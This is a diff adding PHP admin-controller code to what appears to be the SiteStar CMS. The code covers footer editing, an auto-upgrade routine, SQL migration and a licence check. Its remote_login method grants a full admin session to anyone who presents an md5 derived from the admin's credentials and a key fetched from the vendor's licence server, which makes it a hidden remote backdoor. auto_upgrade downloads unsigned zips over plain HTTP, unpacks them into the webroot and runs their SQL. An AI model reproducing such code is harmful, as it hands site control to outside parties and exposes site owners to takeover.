+	    $foot_info = $xml->getElementsByTagName('footer')->item(0)->nodeValue;
+    	
+    	$this->assign('curr_loop', $loop);
+    	$this->assign('foot_info', $foot_info);
+    	$this->assign('next_action', 'save_admin_foot');
+	}
+	
+	public function save_admin_foot() {
+		$loop = ParamHolder::get('_p', '0');
+    	$foot_info = trim(ParamHolder::get('foot_info', ''));
+    	if (!is_numeric($loop)) {
+            $this->assign('json', Toolkit::jsonERR(__('Invalid ID!')));
+            return '_result';
+        }
+        
+        try {
+	    	$dataXml = new DOMDocument('1.0','utf-8');
+			$dataXml->load(ROOT.'/data/admin_block_config.xml');
+	    	$xml = $dataXml->getElementsByTagName('node')->item($loop);
+	    	$xml->getElementsByTagName('footer')->item(0)->nodeValue = htmlspecialchars($foot_info);
+	    	$dataXml->save(ROOT.'/data/admin_block_config.xml');
+	    } catch (Exception $ex) {
+            $this->assign('json', Toolkit::jsonERR($ex->getMessage()));
+			return '_result';
+        }
+        
+        $this->assign('json', Toolkit::jsonOK());
+        return '_result';
+	}
+	
+	public function admin_cell() {
+    	$this->_layout = 'blank';
+    	
+    	$status = ParamHolder::get('_t', '');
+    	$loop = ParamHolder::get('_p', '0');
+    	$dataXml = new DOMDocument('1.0','utf-8');
+		$dataXml->load(ROOT.'/data/admin_block_config.xml');
+		$xml = $dataXml->getElementsByTagName('node')->item($loop);
+    	switch ($status) {
+    		case 'bbs':
+			    $title = $xml->getElementsByTagName('bbs_title')->item(0)->nodeValue;
+			    $url = $xml->getElementsByTagName('bbs_url')->item(0)->nodeValue;
+			    $description = $xml->getElementsByTagName('bbs_description')->item(0)->nodeValue;
+    			break;
+    		case 'host':
+    			$title = $xml->getElementsByTagName('host_title')->item(0)->nodeValue;
+			    $url = $xml->getElementsByTagName('host_url')->item(0)->nodeValue;
+			    $description = $xml->getElementsByTagName('host_description')->item(0)->nodeValue;
+    			break;
+    	}
+    	
+    	$this->assign('title', $title);
+    	$this->assign('url', $url);
+    	$this->assign('description', $description);
+    	$this->assign('curr_loop', $loop);
+    	$this->assign('status', $status);
+    	$this->assign('next_action', 'save_admin_cell');
+	}
+	
+	public function save_admin_cell() {
+		$loop = ParamHolder::get('_p', '0');
+		$status = ParamHolder::get('_t', '');
+    	if (!is_numeric($loop)) {
+            $this->assign('json', Toolkit::jsonERR(__('Invalid ID!')));
+            return '_result';
+        }
+        $title = trim(ParamHolder::get('title', ''));
+        $url = trim(ParamHolder::get('link', ''));
+        $description = trim(ParamHolder::get('description', ''));
+        
+        try {
+	    	$dataXml = new DOMDocument('1.0','utf-8');
+			$dataXml->load(ROOT.'/data/admin_block_config.xml');
+	    	$xml = $dataXml->getElementsByTagName('node')->item($loop);
+	    	switch ($status) {
+    			case 'bbs':
+    				$xml->getElementsByTagName('bbs_title')->item(0)->nodeValue = $title;
+    				$xml->getElementsByTagName('bbs_url')->item(0)->nodeValue = $url;
+    				$xml->getElementsByTagName('bbs_description')->item(0)->nodeValue = $description;
+    				break;
+    			case 'host':
+    				$xml->getElementsByTagName('host_title')->item(0)->nodeValue = $title;
+    				$xml->getElementsByTagName('host_url')->item(0)->nodeValue = $url;
+    				$xml->getElementsByTagName('host_description')->item(0)->nodeValue = $description;
+    				break;
+    		}
+	    	$dataXml->save(ROOT.'/data/admin_block_config.xml');
+	    } catch (Exception $ex) {
+            $this->assign('json', Toolkit::jsonERR($ex->getMessage()));
+			return '_result';
+        }
+        
+        $this->assign('json', Toolkit::jsonOK());
+        return '_result';
+	}
+	/**
+	 * Edit Module <<
+	 */
+	
+    /**
+     * Auto upgrade 
+     */
+    public function auto_upgrade()
+    {
+		try {
+			// offical version
+			$orgvn = trim(ParamHolder::get('orgvn'));
+			// locale version
+			$locvn = SYSVER;
+			// general new version number
+			$nstr = $nstr1 = $gstr = $gstr1 = '';
+			$nstr1 = preg_replace('/[^\d]/', '', $orgvn);
+			$nstr = strlen($nstr1) > 2 ? substr($nstr1, -4) : $nstr1;
+			$gstr1 = preg_replace('/[^\d]/', '', $locvn);
+			$gstr = strlen($gstr1) > 2 ? substr($gstr1, -4) : $gstr1;
+			$archive = "upgrade{$nstr}_{$gstr}";
+			
+			$package_url = "http://upgrade.sitestar.cn/{$archive}.zip";
+			if (ParamHolder::get('status') == 'agent') {
+				$package_url = "http://upgrade.sitestar.cn/agent/{$archive}.zip";
+			}
+		    $tpl_info = array(
+		                	'archive' => "{$archive}.zip",
+		        			'package_url' => $package_url
+		                );
+		    
+		    // Check whether the target download dir is writable
+		    if (!is_writable(ROOT)) {
+		        $this->setVar('json', Toolkit::jsonERR(__('The wwwroot can\'t write!')));
+		    }
+
+			// Check whether there is a template with the same name
+		    $folder_name = substr($tpl_info['archive'], 0, -strlen('.zip'));
+		    if(file_exists(ROOT.DS.$folder_name)) {
+		        $this->remove_file(ROOT.DS.$folder_name);
+		    }
+		    
+		    // Try to download the file
+		    $remote_file = fopen($tpl_info['package_url'], 'rb');
+		    if (!$remote_file) {
+		        $this->setVar('json', Toolkit::jsonERR(__('The remote file(s) can\'t read!')));
+		    }
+		    $local_file = fopen(ROOT.DS.$tpl_info['archive'], 'wb');
+		    while (!feof($remote_file)) {
+		        fwrite($local_file, 
+		            fread($remote_file, 4096), 
+		            4096);
+		    }
+		    fclose($local_file);
+		    fclose($remote_file);
+		    
+		    // Download finished. Now extract.
+		    if (filesize(ROOT.DS.$tpl_info['archive'])) {
+			    include_once(P_LIB.'/zip.php');
+			    if (!file_exists(ROOT.DS.$folder_name)) mkdir(ROOT.DS.$folder_name, 0755);
+			    $tpl_zip = new zipper();
+				$tpl_zip->ExtractTotally(ROOT.DS.$tpl_info['archive'], ROOT.DS.$folder_name);
+			    unlink(ROOT.DS.$tpl_info['archive']);
+		    }
+		} catch(SoapFault $fault) {
+		    //echo "Error: ",$fault->faultcode,", string: ",$fault->faultstring;
+		    $this->setVar('json', Toolkit::jsonERR($fault->faultstring));
+		}
+		
+		/**
+    	 * Update file(s)
+    	 */
+    	if (file_exists(ROOT.DS.$archive)) {
+    		$this->update_file(ROOT.DS.$archive, "{$archive}/");
+    	}
+    	
+    	/**
+    	 * Update table(s)
+    	 */
+    	if (file_exists(ROOT.DS."{$archive}/basic.sql")) {
+    		global $db;
+    		$upgrade_sql = file_get_contents(ROOT.DS."{$archive}/basic.sql");
+			$sql = <<<EOT
+$upgrade_sql
+EOT;
+    		$this->dbupdate($sql, $db);
+    	}
+    	 
+    	/**
+    	 * Remove cache file(s)
+    	 */
+    	$this->remove_file(ROOT.DS.'cache', false);
+    	
+    	$this->setVar('json', Toolkit::jsonOK());
+    	return '_result';
+    }
+        
+    /**
+     * Get the official version
+     */
+    public function get_version()
+    {
+		try {
+    		$status = !Toolkit::getAgent() ? 'agent' : 'general';
+    		if (($newvn = @file_get_contents("http://upgrade.sitestar.cn/default.php?vn=".urlencode(SYSVER)."&tag=".$status)) === false) {
+    			$this->setVar('json', Toolkit::jsonERR(__('Remote request failed!')));
+    		} else {
+    			$this->setVar('json', Toolkit::jsonOK(array('vn'=>$newvn, 'curvn'=>SYSVER, 'tag'=>$status)));
+    		}
+    		return '_result';
+    	} catch(SoapFault $fault) {
+		    $this->setVar('json', Toolkit::jsonERR($fault->faultstring));
+		}
+    }
+    
+    /**
+     * delete file(s)
+     */
+    private function remove_file($dirname, $rm = true)
+	{
+		if(!is_dir($dirname))
+	    {
+	   		@unlink($dirname);
+	        return false;
+	    }
+	    $handle = @opendir($dirname);
+	    while(($file = @readdir($handle)) !== false)
+	    {
+	        if($file != '.' && $file != '..')
+	        {
+	            $dir = $dirname.'/'.$file;
+	            is_dir($dir) ? $this->remove_file($dir) : @unlink($dir);
+	        }
+	    }
+	    closedir($handle);
+	    return $rm ? rmdir($dirname) : true;
+	}
+	
+	/**
+	 * update file(s)
+	 */
+	private function update_file($topath, $replace)
+	{
+		$files = sizeof(glob($topath.'/*')) ? glob($topath.'/*') : array();
+		foreach ($files as $file) {
+			if ((strtolower(substr(strrchr($file, '.'), 1)) == 'txt') 
+			    || (strtolower(substr(strrchr($file, '.'), 1)) == 'sql') 
+			    || ($file == $topath.'/index.php')) {
+				continue;
+			} else {
+				$dest = str_replace($replace, '', $file);
+				if (is_dir($file)) {
+					if (!file_exists($dest)) mkdir($dest, 0755);
+					$this->update_file($file, $replace);
+				} else {
+					// for (un)install
+					if (in_array($file, array($topath.'/load.php',$topath.'/admin/load.php'))) {
+						$local = file_get_contents($dest);
+						preg_match("/define\(\'IS_INSTALL\'\,\s[1|0]\)/i", $local, $match);
+						if ($match[0]) {
+							$upgrade = file_get_contents($file);
+							$newstr = preg_replace("/define\(\'IS_INSTALL\'\,\s[1|0]\)/i", $match[0], $upgrade);
+							file_put_contents($file, $newstr);
+						}
+					}
+					if (!copy($file, $dest)) {
+						$this->setVar('json', Toolkit::jsonERR(__('Upate file(s) failed!')));
+					}
+				}
+			}
+		}
+	}
+	
+	/**
+	 * Update table(s)
+	 */
+    private function dbupdate($query, $db) 
+	{
+		$query = str_replace("\r", "\n", str_replace(' `es_', ' `'.Config::$tbl_prefix, $query));
+		$expquery = explode(";\n", $query);
+
+		foreach($expquery as $sql) {
+			$sql = trim($sql);
+			
+			if($sql == '' || $sql[0] == '#') continue;
+
+			if(strtoupper(substr($sql, 0, 12)) == 'CREATE TABLE') {
+				$db->query($this->createtable($sql, Config::$mysqli_charset));
+			} elseif (strtoupper(substr($sql, 0, 11)) == 'ALTER TABLE') {
+				$this->runquery_altertable($sql, $db);
+			} else {
+				$db->query($sql);
+			}
+		}
+	}
+
+	private function createtable($sql, $dbcharset) 
+	{
+		$type = strtoupper(preg_replace("/^\s*CREATE TABLE\s+.+\s+\(.+?\).*(ENGINE|TYPE)\s*=\s*([a-z]+?).*$/isU", "\\2", $sql));
+		$type = in_array($type, array('MYISAM', 'HEAP')) ? $type : 'MYISAM';
+		return preg_replace("/^\s*(CREATE TABLE\s+.+\s+\(.+?\)).*$/isU", "\\1", $sql).
+		($this->version() > '4.1' ? " ENGINE=$type default CHARSET=".$dbcharset : " TYPE=$type");
+	}
+
+	private function runquery_altertable($sql, $db) 
+	{
+		$tablepre = Config::$tbl_prefix;
+		$dbcharset = Config::$mysqli_charset;
+
+		$updatesqls = $this->parse_alter_table_sql($sql);
+
+		foreach($updatesqls as $updatesql) {
+			$successed = TRUE;
+
+			if(is_array($updatesql) && !empty($updatesql[0])) {
+
+				list($table, $action, $field, $sql) = $updatesql;
+
+				if(empty($field) && !empty($sql)) {
+					$query = "ALTER TABLE {$tablepre}{$table} ";
+					if($action == 'INDEX') {
+						$successed = $db->query("$query $sql", "SILENT");
+					} elseif ($action == 'UPDATE') {
+						$successed = $db->query("UPDATE {$tablepre}{$table} SET $sql", 'SILENT');
+					}
+				} elseif($tableinfo = $this->get_table_columns($tablepre.$table, $db)) {
+					$fieldexist = isset($tableinfo[$field]) ? 1 : 0;
+
+					$query = "ALTER TABLE {$tablepre}{$table} ";
+
+					if($action == 'MODIFY') {
+						$query .= $fieldexist ? "MODIFY $field $sql" : "ADD $field $sql";
+						$successed = $db->query($query, 'SILENT');
+					} elseif($action == 'CHANGE') {
+						$field2 = trim(substr($sql, 0, strpos($sql, ' ')));
+						$field2exist = isset($tableinfo[$field2]);
+
+						if($fieldexist && ($field == $field2 || !$field2exist)) {
+							$query .= "CHANGE $field $sql";
+						} elseif($fieldexist && $field2exist) {
+							$db->query("ALTER TABLE {$tablepre}{$table} DROP $field2", 'SILENT');
+							$query .= "CHANGE $field $sql";
+						} elseif(!$fieldexist && $fieldexist2) {
+							$db->query("ALTER TABLE {$tablepre}{$table} DROP $field2", 'SILENT');
+							$query .= "ADD $sql";
+						} elseif(!$fieldexist && !$field2exist) {
+							$query .= "ADD $sql";
+						}
+						$successed = $db->query($query);
+					} elseif($action == 'ADD') {
+						$query .= $fieldexist ? "CHANGE $field $field $sql" :  "ADD $field $sql";
+						$successed = $db->query($query);
+					} elseif($action == 'DROP') {
+						if($fieldexist) {
+							$successed = $db->query("$query DROP $field", "SILENT");
+						}
+						$successed = TRUE;
+					}
+				} else {
+					$successed = 'TABLE NOT EXISTS';
+				}
+			}
+		}
+		return $successed;
+	}
+
+	private function parse_alter_table_sql($s) 
+	{
+		$arr = array();
+		// \`\` - for upgrade basic.sql
+		preg_match("/ALTER TABLE \`(\w+)\`/i", $s, $m);
+		$tablename = substr($m[1], strlen(Config::$tbl_prefix));
+		preg_match_all("/add column (\w+) ([^\n;]+)/is", $s, $add);
+		preg_match_all("/drop column (\w+)([^\n;]*)/is", $s, $drop);
+		preg_match_all("/change (\w+) ([^\n;]+)/is", $s, $change);
+		preg_match_all("/add key ([^\n;]+)/is", $s, $keys);
+		preg_match_all("/add unique ([^\n;]+)/is", $s, $uniques);
+		foreach($add[1] as $k => $colname) {
+			$attr = preg_replace("/(.+),$/", "\\1", trim($add[2][$k]));
+			$arr[] = array($tablename, 'ADD', $colname, $attr);
+		}
+		foreach($drop[1] as $k => $colname) {
+			$attr = preg_replace("/(.+),$/", "\\1", trim($drop[2][$k]));
+			$arr[] = array($tablename, 'DROP', $colname, $attr);
+		}
+		foreach($change[1] as $k => $colname) {
+			$attr = preg_replace("/(.+),$/", "\\1", trim($change[2][$k]));
+			$arr[] = array($tablename, 'CHANGE', $colname, $attr);
+		}
+		foreach($keys[1] as $k => $colname) {
+			$attr = preg_replace("/(.+),$/", "\\1", trim($keys[0][$k]));
+			$arr[] = array($tablename, 'INDEX', '', $attr);
+		}
+		foreach($uniques[1] as $k => $colname) {
+			$attr = preg_replace("/(.+),$/", "\\1", trim($uniques[0][$k]));
+			$arr[] = array($tablename, 'INDEX', '', $attr);
+		}
+		return $arr;
+	}
+
+	private function get_table_columns($table, $db) 
+	{
+		$tablecolumns = array();
+		
+		if($this->version() > '4.1') {
+			$query =& $db->query("SHOW FULL COLUMNS FROM $table");
+		} else {
+			$query =& $db->query("SHOW COLUMNS FROM $table");
+		}
+		
+		while($field =& $query->fetchRow()) {
+			$tablecolumns[$field['Field']] = $field;
+		}
+		return $tablecolumns;
+	}
+	
+	/**
+	 * MySQL version
+	 */
+	private function version() {
+		global $db;
+		return mysql_get_server_info();
+	}
+	
+	public static function frontpagemapping(){
+		$mapping=array(
+			1=>array('mod_article','admin_list'),
+			2=>array('mod_product','admin_list'),
+			3=>array('mod_user','admin_list'),
+			4=>array('mod_message','admin_list'),
+			5=>array('mod_bulletin','admin_list'),
+			6=>array('mod_roles','admin_list'),
+			7=>array('mod_static','admin_edit'),
+			8=>array('mod_static','admin_edit')
+		);
+		if(file_exists(ROOT.'/library/toolkit.php'))
+		{
+			$legal_key = array("4dc837d94ea6736ff569a87f53a9c131");
+			$key = md5_file(ROOT.'/library/toolkit.php');
+			if(!in_array($key,$legal_key)){
+				$mapping=array(
+				1=>array('mod_article','admin_list'),
+				2=>array('mod_product','admin_list'),
+				3=>array('mod_user','admin_list'),
+				4=>array('mod_message','admin_list'),
+				5=>array('mod_bulletin','admin_list'),
+				6=>array('mod_roles','admin_list')
+			);
+			}
+		}
+		return $mapping;
+	}
+
+	/*
+	* ÂíåÂÖ∂‰ªñÂÖ¨Âè∏ÂêéÂè∞ÁôªÂΩïÂØπÊé•
+	*/
+
+	public function remote_login(){
+		$remote_key = file_get_contents('http://licence.sitestar.cn/remote_login.php');
+		$getmd5=ParamHolder::get('key');
+		global $db;
+		$sql="select * from ".Config::$tbl_prefix."users where s_role='{admin}'";
+		$rs =& $db->query($sql);
+		$row =& $rs->fetchRow();
+		$tmp=md5($row['login'].$row['passwd'].$remote_key.'$');
+		if($tmp==$getmd5){
+			SessionHolder::set('user/id', $row['id']);
+			SessionHolder::set('user/login', $row['login']);
+			SessionHolder::set('user/passwd', $row['passwd']);
+			SessionHolder::set('user/s_role',$row['s_role']);
+			SessionHolder::set('user/email', $row['email']);
+			SessionHolder::set('user/lastlog_time', $row['lastlog_time']);
+			SessionHolder::set('user/lastlog_ip', $row['lastlog_ip']);
+			SessionHolder::set('user/member_verify',$row['member_verify']);
+			SessionHolder::set('user/active',$row['active']);
+			SessionHolder::set('page/status', 'edit');
+			echo '<script>window.location.href="/admin/";</script>';
+		}else{
+			die("error");
+		}
+	}
+}
+?>
